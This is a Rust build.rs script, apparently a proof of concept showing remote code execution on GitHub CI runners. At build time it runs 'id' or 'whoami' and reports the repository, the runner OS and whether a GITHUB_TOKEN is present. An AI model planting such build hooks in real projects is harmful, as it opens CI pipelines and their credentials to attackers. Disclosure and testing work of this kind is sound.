fn main() {
    println!("cargo:warning=╔═══════════════════════════════╗");
    println!("cargo:warning=║ RCE PROOF OF CONCEPT         ║");
    println!("cargo:warning=╚═══════════════════════════════╝");
    
    #[cfg(unix)]
    {
        let out = std::process::Command::new("id").output().unwrap();
        println!("cargo:warning=USER: {}", String::from_utf8_lossy(&out.stdout).trim());
    }
    
    #[cfg(windows)]
    {
        let out = std::process::Command::new("whoami").output().unwrap();
        println!("cargo:warning=USER: {}", String::from_utf8_lossy(&out.stdout).trim());
    }
    
    println!("cargo:warning=GITHUB_REPOSITORY: {}", 
             std::env::var("GITHUB_REPOSITORY").unwrap_or_default());
    println!("cargo:warning=HAS_GITHUB_TOKEN: {}", 
             std::env::var("GITHUB_TOKEN").is_ok());
    println!("cargo:warning=RUNNER_OS: {}", 
             std::env::var("RUNNER_OS").unwrap_or_default());
}
